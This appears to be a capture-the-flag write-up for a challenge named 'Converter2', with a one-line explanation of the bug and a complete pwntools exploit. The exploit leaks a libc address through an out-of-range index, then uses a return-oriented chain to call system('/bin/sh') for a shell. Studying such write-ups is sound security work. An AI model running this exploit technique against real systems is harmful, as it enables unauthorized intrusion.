# Converter2

The code is similar to the previous one but here there is a `i <= 0` check, but we can still change `i` to be a large number and get a libc leak. Since there is no canary, we can simply use rop to get a shell.

```python
from pwn import *
context.arch = "amd64"

io = process("./chal")
# io = remote("amt.rs", 31631)
elf = ELF("./chal")
libc = ELF("./libc.so.6")
rop = ROP(elf)

if args.GDB:
	gdbscript="""
	b *main+179
	c
	"""
	gdb.attach(io, gdbscript=gdbscript)

payload = b"A"*28
payload += p32(205)
payload += p64(0)
payload += p64(rop.find_gadget(["ret"])[0])
payload += p64(elf.sym["main"])
io.sendlineafter(b"hex:", payload)

io.recvline()
leak = int(io.recv(12), 16)
info(f"libc leak: {hex(leak)}")
libc.address = leak - 0x27245
info(f"libc base: {hex(libc.address)}")

rop = ROP(libc)
payload = b"B"*28
payload += p32(50)
payload += p64(0)
payload += p64(rop.find_gadget(["pop rdi","ret"])[0])
payload += p64(next(libc.search(b"/bin/sh")))
payload += p64(rop.find_gadget(["ret"])[0])
payload += p64(libc.sym["system"])

io.sendlineafter(b"hex:", payload)
io.clean()

io.interactive()
```